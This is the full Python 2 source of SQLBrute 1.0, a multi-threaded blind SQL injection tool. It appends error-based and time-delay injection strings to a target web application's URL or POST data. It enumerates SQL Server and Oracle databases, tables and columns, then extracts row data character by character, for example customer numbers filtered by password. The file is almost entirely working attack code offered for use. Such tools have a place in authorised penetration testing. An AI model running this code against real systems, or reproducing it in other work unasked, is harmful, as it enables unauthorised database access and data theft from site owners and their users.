#!/bin/sh
''':'
exec python -O -u "$0" ${1+"$@"}
' '''

# SQLBrute - multi threaded blind SQL injection bruteforcer
# By Justin Clarke, justin gdssecurity com
#
# Algorithm inspired by the original by Kerry Rollins
#
# This version does regex based (error/no error) bruteforcing and waitfor delay testing
#
# There is a page documenting how to use this tool at:
# http://www.justinclarke.com/archives/2006/03/sqlbrute.html
#
# Also, a compiled version for Windows (using py2exe) is available if you're having
# problems with SQLBrute (or ensure you are using Python 2.5). It's available at:
# http://www.justinclarke.com/security/sqlbrute.zip
# 
Version = "1.0"

# todo
# The (hopefully) final python version - next version is going to be a .NET rewrite, including:

import threading
import Queue
import sys
import getopt
import string
import urllib
import cgi
import time
import re
import urllib2

# Set some globals
sslSupport = True

# see if SSL support is compiled in for urllib2
try:
    import _ssl
except ImportError:
    print "SSL support not installed - https will not be available"
    sslSupport = False

#
# class to manage the threading.  No actual stuff is done in here - we pass function names and args
#
# Adapted from Python in a Nutshell (excellent book)
#
class Worker(threading.Thread): # inherits the Thread class
    requestID = 0   # each thread has a request ID so we can match responses
    
    # constructor - takes two queues as parameters (overrides threading constructor)
    def __init__(self, requestsQueue, resultsQueue, threadNumber, **kwds):
        threading.Thread.__init__(self, **kwds)
        self.setDaemon(1)   # run in background
        self.workRequestQueue = requestsQueue
        self.resultQueue = resultsQueue
        self.setName(threadNumber)
        self.start()        # start the thread

    # call the function here - pass in the function and parameters
    def performWork(self, callable, *args, **kwds):
        Worker.requestID += 1
        self.workRequestQueue.put((Worker.requestID, callable, args, kwds))
        return Worker.requestID

    def run(self):   # override run
        while 1:
            requestID, callable, args, kwds = self.workRequestQueue.get()
            self.resultQueue.put((requestID, callable(*args+(int(self.getName()),), **kwds)))

class sqlbrute:
    # User variables - change if you want
    num = 5            # default number of worker threads
    targeturl = ""
    cookie = ""
    verb = ""
    verbose = 1
    postdata = ""
    table = ""
    cols = ""
    headers = [["User-Agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"]]
    wherecol = ""
    whereval = ""
    dbenum = False          # default to enumerating tables from current database
    enumtype = ""           # by default, tables will be enumerated from current database
    dbtype = "sqlserver"
    errorregex = ""
    targeturl = ""
    timetrack = time.time()
    timeout = 60             # timeout to wait for responses before exiting tool
    database = ""           # database to use (instead of default)
    andor = " OR "          # default to "or" mode.  either "or" or "and"
                            # specifies this is going to be select * from foo where 1=2 _and_ <exploit string>

    method = "error"        # method of testing - error or time based

    outputfile = ""
    
    if sys.platform == "win32":     # timing is unreliable in python.org win32 version. I'd use linux for now
        waitfor = 10
    else:
        waitfor = 7

    if sys.platform == "win32":
        waitres = 5         # time.time() is hideously unreliable in windows
    else:
        waitres = 5

    tablesource = "sysobjects"    # name of source to initially query
    namecol = "name"                # column used for the database name
    substrfn = "SUBSTRING"      # substring for SQL, substr for oracle

    reqcounter = 0            # number of test requests received
    testcounter = 0           # counter to track that requests have passed and failed appropriately
    testvar = 0
    
    requestsQueue = Queue.Queue()
    resultsQueue = Queue.Queue()

    # add any additional characters you need matched to this list
    matches = ["e","t","a","o","i","n","s","r","h","l","d","u","c","f","m","w","y","g","p","b","v","k","x","j","q","z","0","1","2","3","4","5","6","7","8","9","-",".","[_]","+","#","@","$"]

    def usage(self):
        print """
 ___  _____  __    ____  ____  __  __  ____  ____ 
/ __)(  _  )(  )  (  _ \(  _ \(  )(  )(_  _)( ___)
\__ \ )(_)(  )(__  ) _ < )   / )(__)(   )(   )__) 
(___/(___/\\\\(____)(____/(_)\_)(______) (__) (____)
"""
        print "v.%s" % Version
        print """
    Usage: %s options url
            [--help|-h]                        - this help
            [--verbose|-v]                     - verbose mode
            [--server|-d oracle|sqlserver]     - type of database server (default MS SQL Server)
            [--error|-e regex]                 - regex to recognize error page (error testing only)
            [--threads|-s number]              - number of threads (default 5)
            [--cookie|-k string]               - cookies needed
            [--time|-n]                        - force time delay (waitfor) testing 
            [--data|-p string]                 - POST data
            [--database|-f database]           - database to enumerate data from (SQL Server)
            [--table|-t table]                 - table to extract data from
            [--column|-c column]               - column to extract data from
            [--where|-w column=data]           - restrict data returned to rows where column "column" matches "data"
            [--header|-x header::val]          - header to add to the request (i.e. Referer::http://foobar/blah.asp)
            [--output|-o file]                 - file to send output to
            
Note: exploit will go on the end of the query or post data.  This must be correctly formatted for a SQL subquery to be appended.
        """ % sys.argv[0]

        print '''e.g. %s --data "searchtype=state&state=1'" --error "NO RESULTS" --database webapp --table customer --column custnum --where password=password http://myapp/locator.asp''' % sys.argv[0]

    # buyer beware if you change anything below - execution starts here
    def main(self, argv=None):
        if argv is None:
            argv = sys.argv

        try:
            try:
                opts, args = getopt.getopt(argv[1:], "hvs:k:f:np:x:d:t:c:w:e:o:", \
["help","verbose","server=","header=","error=","threads=","cookie=","database=","time","data=","table=","column=","where=","output="])
                if len(args) <> 1:  # 1 arg is the URL
                    print "Args <> 1" 
                    raise getopt.error
            except:
                raise getopt.error

            self.targeturl = args
            if sslSupport == False and re.search(r'https://', self.targeturl):
                print "You don't seem to have SSL support installed, so no https URLs for you"
                return 1

            for o,a in opts:
                if o in ("-v", "--verbose"):
                    self.verbose += 1
                if o in ("-x", "--header"):
                    self.headers += [a.split("::",1)]
                if o in ("-k", "--cookie"):
                    self.cookie = a
                if o in ("-h", "--help"):
                    self.usage()
                    return 1
                if o in ("-p", "--data"):
                    self.postdata = a
                    self.verb = "POST"
                if o in ("-n", "--time"):
                    self.method = "time"
                if o in ("-s", "--threads"):
                    self.num = int(a)
                    if self.num < 1:
                        print "Threads must be at least 1"
                        return 1
                if o in ("-d", "--server"):
                    if a == "oracle": self.dbtype = a
                    if a == "sqlserver": self.dbtype = a
                if o in ("-t", "--table"):
                    self.table = a
                if o in ("-c","--column"):
                    self.cols = a
                if o in ("-w", "--where"):
                    temp = a.split("=",1)
                    self.wherecol = temp[0]
                    self.whereval = temp[1]
                if o in ("-e", "--error"):
                    self.errorregex = a
                    self.method = "error"
                if o in ("-f", "--database"):
                    self.database = a
                if o in ("-o", "--output"):
                    self.outputfile = a

            if self.cols<>"":
                if self.table=="":
                    print "If requesting column data, you must specify table"
                    return 1

            if not self.errorregex:
                self.errorregex = r"(error|could not process)"

            if not self.verb:
                self.verb = "GET"

            if (self.verb == "POST" and not self.postdata):
                print "Specify some POST data"
                return 1
            
            if self.enumtype=="":
                if self.table=="" and self.cols=="":
                    if self.dbtype == "sqlserver" and not self.database:
                        self.enumtype="database"
                    else:
                        self.enumtype="table"
                else:
                    if self.table<>"" and self.cols=="":
                        self.enumtype="column"
                    else:
                        self.enumtype="data"

            if self.dbtype=="oracle":
                self.substrfn = "SUBSTR"
                self.tablesource = "USER_TABLES"
                self.namecol = "TABLE_NAME"

            if self.verbose:
                print "Database type: %s" % self.dbtype
                print "Table: %s" % self.table
                print "Columns: ", self.cols
                print "Enumeration mode: %s" % self.enumtype
                print "Threads: %d" % self.num

            if self.database and self.dbtype=="oracle":
                print "Database specification is not valid for Oracle"
                return 1

            if self.database != "":         # add .. for between database and table
                self.database += ".."

        except:
            print "Incorrect options usage"
            self.usage()
            return 1

        # create worker classes to assign work to later
        for i in range(self.num):
            self.worker = Worker(self.requestsQueue, self.resultsQueue, i)

        # keep track of what we send off to the queues
        self.workRequests = {}
            
        if self.verbose:
            print "Testing the application to ensure your options work\n"

        if self.method == "error":
            self.testvar = self.testexploiterror()
        else:
            self.testvar = self.testexploittime()

        if self.testvar==1:
            print """
    To troubleshoot:

    1) try using -v to see that the queries are correctly formatted
    2) try using -vv to get the responses printed to the screen
    3) fix your broken url/post data
    4) check the error value you are using
    5) you've specified the correct database type haven't you?"""
            return(1)
        
        print "This program will currently exit " + str(self.timeout) + " seconds after the last response comes in."

        for i in self.matches:
            if self.method == "error":
                self.gentesterror(i)
            else:
                self.gentesttime(i)

        self.showResults()

    def postReformat(self, postdata):
        return urllib.urlencode(cgi.parse_qsl(postdata))

    def querystringReformat(self, qsdata):
        temp = qsdata.split("?")
        if len(temp) == 2:
            return temp[0] + "?" + urllib.urlencode(cgi.parse_qsl(temp[1]))
        else:
            return qsdata
    
    def doRequest(self, expressionString, exploitdata, match, type, threadName):
        while True:
            if self.verb == "GET":
                req = urllib2.Request(self.querystringReformat(expressionString))
            else:
                req = urllib2.Request(self.querystringReformat(expressionString),
                                          self.postReformat(exploitdata))

            if self.cookie<>"":
                req.add_header("Cookie",self.cookie)

            if self.headers<>[[]]:
                for i in self.headers:
                    req.add_header(i[0],i[1])

            try:
                starttime = time.time()  # get time at start of request
                resp = urllib2.urlopen(req)
                    
            except urllib2.HTTPError,err:  # catch an HTTP 500 error or similar here
                return err.read(), match, type, starttime, time.time()
            except:
                import traceback
                traceback.print_exc(file=sys.stderr)
                sys.stderr.flush()
                
                print "Unexpected error on: %s %s - Retrying in 5 seconds" % (expressionString,exploitdata)
                time.sleep(5)
            else:
                return resp.read(), match, type, starttime, time.time()

    def testexploiterror(self):
        if self.dbtype=="sqlserver":
            positivestring = self.andor + "exists (select * from master..sysdatabases)--"
            negativestring = self.andor + "not exists (select * from master..sysdatabases)--"

        if self.dbtype=="oracle":
            positivestring = self.andor + "exists (select * from USER_TABLES)--"
            negativestring = self.andor + "not exists (select * from USER_TABLES)--"

        self.genreq(positivestring, "", False)
        self.genreq(negativestring, "", False)

        while self.reqcounter != 2:
            try:
                id, results = self.resultsQueue.get_nowait()
            except Queue.Empty:
                if (time.time() - self.timetrack) > self.timeout:    # if its been > (timeout) seconds since last successful resp
                    print "Timed out accessing application\n"
                    return(1)
                else:
                    continue

            self.timetrack = time.time()        # update record of last successful response
            self.reqcounter += 1                # update number of requests received
            
            if self.verbose>1:
                print 'Result %d: -> %s' % (id, urllib.unquote(self.workRequests[id]))
                print 'Response: %s' % results[0]
                print 'Results: %s, %s' % (results[1], results[2])

            if not re.search(self.errorregex,results[0]) :       # no error returned
                self.testcounter += 1              # increment counter 1 if no error returned
                if self.verbose>1:
                    print "No Error"
            else:       # error returned
                self.testcounter += 2              # increment counter 2 is error returned
                if self.verbose>1:
                    print "Error"

        if self.testcounter == 3:                  # one failed, one passed request (success!)
            if self.verbose:
                print "Exploit and parameters appear to work\n"
                return(0)
        else:                       # failed :-(
            if self.andor == " OR ":       # if we were using or, try changing to AND
                if self.verbose:
                    print "OR doesn't appear to work - trying AND"
                self.andor = " AND "
                self.reqcounter = 0
                self.testcounter = 0
                return (self.testexploiterror())
            else:
                print "User input exploit and parameters do not appear to work for error testing - trying time testing\n"
                return(self.testexploittime())        

    def testexploittime(self):
        teststring = "%3Bwaitfor delay '0:0:" + str(self.waitfor) + "'--"

        self.genreq(teststring, "", False)

        waiting = True
        
        while waiting:
            try:
                id, results = self.resultsQueue.get_nowait()
            except Queue.Empty:
                continue

            waiting = False
            if self.verbose>1:
                print 'Result %d: -> %s' % (id, urllib.unquote(self.workRequests[id]))
                print 'Response: %s' % results[0]
                print 'Start time: %s' % results[3]
                print 'Finish time: %s' % results[4]
       
            if results[4]-results[3] > (self.waitfor-self.waitres):       # time testing worked
                self.method = "time"
                elapsed = results[4] - results[3]
                if elapsed > (self.waitfor * 2):  # slow app
                    self.timeout *= (elapsed/self.waitfor)
                if self.verbose:
                    print "Exploit and parameters appear to work for time testing\n"
                return(0)
            else:                       # failed :-(
                print "User input exploit and parameters do not appear to work for time testing\n"
                return(1)
            
    # generate checks - these get multithreaded on the queue
    def genreq(self, request, match, type):
        if self.verb == "GET":  # standard GET request- exploit querystring
            expressionString = self.targeturl[0] + request
            exploitdata=""
        elif (self.verb == "GET" and self.postdata): # post request, but exploit querystring
            expressionString = self.targeturl[0] + request
            exploitdata = self.postdata
        else:
            expressionString = self.targeturl[0] # standard post request, exploit post data
            exploitdata = self.postdata + request

        id = self.worker.performWork(self.doRequest, expressionString, exploitdata, match, type)
        if self.verb == "GET":
            self.workRequests[id] = expressionString
        else:
            self.workRequests[id] = exploitdata

    # handle underscores
    def unquote(self, s):
        return re.sub(r'\[\_\]','_',s)

    # generate the testing string as a series of CHAR()+CHAR or CONCAT(CHR(),CHR()) strings
    def genchars(self, s):
        t = self.unquote(s)
        foo = len(t)

        if self.dbtype=="oracle":          # use concat statements for oracle
            if foo==1:       # one character - no concat
                bar = "CHR("+str(ord(t[0].upper()))+")"
            else:          # generate one concat statement
                if foo==2:
                    bar = "CONCAT(CHR("+str(ord(t[0].upper()))+"),CHR("+str(ord(t[1].upper()))+"))"
                else:       # generate mutiple statements
                    bar = ""
                    for i in range((foo-1)):
                        bar += "CONCAT(CHR("+str(ord(t[i].upper()))+"),"
                    bar += "CHR("+str(ord(t[foo-1].upper()))+")"
                    for i in range(foo-1):
                        bar += ")"
        else:           # sql server, so use + signs for concatentation
            if foo==1:       # one char
                bar = "CHAR("+str(ord(t[0].upper()))+")"
            else:          # generate CHAR()+CHAR() statements
                bar = ""
                for i in range((foo-1)):
                    bar += "CHAR("+str(ord(t[i].upper()))+")%2B"
                bar += "CHAR("+str(ord(t[foo-1].upper()))+")"
        return bar

    # generate the guess cases - error
    def gentesterror(self, s):
        foo = ""
        if self.dbtype == "sqlserver":
            foo = "xtype='u' and "

       # SQL injection constructors - these assume we can just add these onto the end of the URL or post data

        if self.enumtype=="database":       # sql server only
            pretable = self.andor + "exists (select * from master..sysdatabases where " + self.substrfn + "(UPPER(" + self.namecol + "),1,"
            midtable = ")="
            posttable = ")--"

        if self.enumtype=="table":
            pretable = self.andor + "exists (select * from " + self.database + self.tablesource + " where " + foo + self.substrfn + "(UPPER(" + self.namecol + "),1,"
            midtable = ")="
            posttable = ")--"

        if self.enumtype=="column":
            if self.dbtype=="sqlserver":
                pretable = self.andor + "exists (select * from " + self.database + "syscolumns where id = object_id('" + self.database + self.table + "') and " + self.substrfn + "(UPPER(" + self.namecol + "),1,"
                midtable = ")="
                posttable = ")--"
            else:
                pretable = self.andor + "exists (select * from ALL_TAB_COLUMNS where TABLE_NAME=UPPER('" + self.table + "') and " + self.substrfn + "(UPPER(COLUMN_NAME),1,"
                midtable = ")="
                posttable = ")--"

        if self.enumtype=="data":
            if self.dbtype=="sqlserver":
                if self.wherecol == "":         # no where clause supplied
                    pretable = self.andor + "exists (select * from " + self.database + self.table + " where " + self.substrfn + "(UPPER(convert(varchar," + self.cols + ",2)),1,"
                else:       # where clause supplied
                    pretable = self.andor + "exists (select * from " + self.database + self.table + " where " + self.wherecol + "='" + self.whereval + "' and " + self.substrfn + "(UPPER(convert(varchar," + self.cols + ",2)),1,"
                midtable = ")="
                posttable = ")--"
            else:           # oracle
                if self.wherecol == "":         # no where clause supplied
                    pretable = self.andor + "exists (select * from " + self.table + " where " + self.substrfn + "(UPPER(TO_CHAR(" + self.cols + ")),1,"
                else:       # where clause supplied
                    pretable = self.andor + "exists (select * from " + self.table + " where " + self.wherecol + "='" + self.whereval + "' and " + self.substrfn + "(UPPER(TO_CHAR(" + self.cols + ")),1,"
                midtable = ")="
                posttable = ")--"

        teststring = self.genchars(s)

        self.genreq(pretable + str(len(self.unquote(s))) + midtable + teststring + posttable, s, True)

    # generate test cases - time
    def gentesttime(self, s):
        prewaitforlike = "%3Bif EXISTS (select name from master..sysdatabases where name like '"
        postwaitfor = "%') waitfor delay '0:0:" + str(self.waitfor) + "'--"

        predblike = "%3Bif EXISTS (select name from " + self.database + "sysobjects where xtype = 'u' and name like '"

        pretablike = "%3Bif EXISTS (select name from " + self.database + "syscolumns where id in (select id from " + self.database + "sysobjects where name = '" + self.table + "') and name like '"

        if self.whereval=="":    # enumerating values in a specific column
            predatalike = "%3Bif EXISTS (select * from " + self.database + self.table + " where CONVERT(varchar," + self.cols + ",2) like '"
        else:       
            prejoinlike = "%3Bif EXISTS (select * from " + self.database + self.table + " where CONVERT(varchar," + self.wherecol + ",2) = '" + self.whereval + "' AND CONVERT(varchar," + self.cols + ",2) like '"

        if self.enumtype=="database":
            self.genreq(prewaitforlike + s + postwaitfor, s, True)
        if self.enumtype=="table":
            self.genreq(predblike + s + postwaitfor, s, True)
        if self.enumtype=="column":
            self.genreq(pretablike + s + postwaitfor, s, True)
        if self.enumtype=="data":
            if self.whereval=="":
                self.genreq(predatalike + s + postwaitfor,s,True)
            else:
                self.genreq(prejoinlike + s + postwaitfor,s,True)

    def checkmatchtime(self, s):
        prewaitforequals = "%3Bif EXISTS (select name from master..sysdatabases where name = '"
        postwaitforequals = "') waitfor delay '0:0:" + str(self.waitfor) + "'--"

        predbequals = "%3Bif EXISTS (select name from " + self.database + "sysobjects where xtype = 'u' and name = '"

        pretabequals =  "%3Bif EXISTS (select name from " + self.database + "syscolumns where id in (select id from " + self.database + "sysobjects where name = '" + self.table + "') and name = '"

        if self.whereval=="":    # enumerating values in a specific column
            predataequals = "%3Bif EXISTS (select * from " + self.database + self.table + " where CONVERT(varchar," + self.cols + ",2) = '"
        else:
            prejoinequals = "%3Bif EXISTS (select * from " + self.database + self.table + " where CONVERT(varchar," + self.wherecol + ",2) = '" + self.whereval + "' AND CONVERT(varchar, " + self.cols + ",2) = '"

        if self.enumtype=="database":
            self.genreq(prewaitforequals + self.unquote(s) + postwaitforequals, s, False)
        if self.enumtype=="table":
            self.genreq(predbequals + self.unquote(s) + postwaitforequals, s, False)
        if self.enumtype=="column":
            self.genreq(pretabequals + self.unquote(s) + postwaitforequals, s, False)
        if self.enumtype=="data":
            if self.whereval=="":
                self.genreq(predataequals + self.unquote(s) + postwaitforequals, s, False)
            else:
                self.genreq(prejoinequals + self.unquote(s) + postwaitforequals, s, False)

    # generate check for whether we have an exact match (error testing)
    def checkmatcherror(self, s):
        foo = ""
        if self.dbtype == "sqlserver":
            foo = "xtype='u' and "

        # SQL injection constructors - these assume we can just add these onto the end of the URL or post data
        if self.enumtype=="database":       # only valid for sql server
            pretable = self.andor + "exists (select * from master..sysdatabases where UPPER(" + self.namecol + ")="
            posttable = ")--"

        if self.enumtype=="table":
            pretable = self.andor + "exists (select * from " + self.database + self.tablesource + " where UPPER(" + self.namecol +")="
            posttable = " )--"

        if self.enumtype=="column":
            if self.dbtype=="sqlserver":
                pretable = self.andor + "exists (select * from " + self.database + "syscolumns where id = object_id(" + self.genchars(self.database + self.table) + ") and UPPER(" + self.namecol + ")="
                posttable = ")--"
            else:
                pretable = self.andor + "exists (select * from ALL_TAB_COLUMNS where TABLE_NAME=UPPER(" + self.genchars(self.table) + ") and UPPER(COLUMN_NAME)="
                posttable = ")--"

        if self.enumtype=="data":
            if self.dbtype=="sqlserver":
                if self.wherecol == "":         # no where clause supplied
                    pretable = self.andor + "exists (select * from " + self.database + self.table + " where UPPER(convert(varchar," + self.cols + ",2))="
                else:       # where clause supplied
                    pretable = self.andor + "exists (select * from " + self.database + self.table + " where " + self.wherecol + "=" + self.genchars(self.whereval) + " and UPPER(convert(varchar," + self.cols + ",2))="
                posttable = ")--"
            else:   # oracle
                if self.wherecol == "":         # no where clause supplied
                    pretable = self.andor + "exists (select * from " + self.table + " where UPPER(TO_CHAR(" + self.cols + "))="
                else:       # where clause supplied
                    pretable = self.andor + "exists (select * from " + self.table + " where " + self.wherecol + "=" + self.genchars(self.whereval) + " and UPPER(TO_CHAR(" + self.cols + "))="
                midtable = ")="
                posttable = ")--"

        teststring = self.genchars(s)

        self.genreq(pretable + teststring + posttable, s, False)

    # used to check results and exact checks
    def showResults(self):
        self.timetrack = time.time()
        while True:
            try:
                id, results = self.resultsQueue.get_nowait()
            except Queue.Empty:
                if (time.time() - self.timetrack) > self.timeout:    # if its been > (timeout) seconds since last successful resp
                    break
                else:
                    continue

            self.timetrack = time.time()        # update record of last successful response

            if self.verbose>1:
                print 'Result %d: -> %s' % (id, urllib.unquote(self.workRequests[id]))
                print 'Results: %s, %s' % (results[1], results[2])
                print 'Start time: %s' % results[3]
                print 'Finish time: %s' % results[4]

            if self.verbose>2:
                print 'Response: %s' % results[0]
                                
            if self.method == "error":    # if using error testing
                if not re.search(self.errorregex,results[0]) :       # no error returned
                    if self.verbose > 1:
                        print 'No error'
                    if results[2]:                       # if a guess match test
                        if self.verbose:
                            print "%s" % self.unquote(results[1])
                        self.checkmatcherror(results[1])
                    else:
                        print "Found: %s" % self.unquote(results[1])
                        for i in self.matches:
                            self.gentesterror(results[1]+i)
                        if self.outputfile != "":
                            outputhandle = file(self.outputfile, 'a', 0)
                            outputhandle.write(self.unquote(results[1])+"\r\n")
                            outputhandle.close()
                else:       # no match
                    if self.verbose > 1:
                        print 'Error detected'

                    if not results[2]:                   # if was an exact match test (and failed) generate more
                        for i in self.matches:
                            self.gentesterror(results[1]+i)
            else:   # if time based testing
                if results[4]-results[3] > (self.waitfor-self.waitres):       # we had a match
                    if results[2]:         # guess match test
                        if self.verbose:
                            print "%s" % self.unquote(results[1])
                        self.checkmatchtime(results[1])
                    else:    # exact match test
                        print "Found: %s" % self.unquote(results[1])
                        for i in self.matches:
                            self.gentesttime(results[1]+i)
                        if self.outputfile != "":
                            outputhandle = file(self.outputfile, 'a', 0)
                            outputhandle.write(self.unquote(results[1])+"\r\n")
                            outputhandle.close()
                else:       # no match
                    if not results[2]:  # if it was an exact match condition (and failed) - iterate further
                        for i in self.matches:
                            self.gentesttime(results[1]+i)


# main called here

if __name__ == "__main__":
    instance = sqlbrute()
    sys.exit(instance.main())
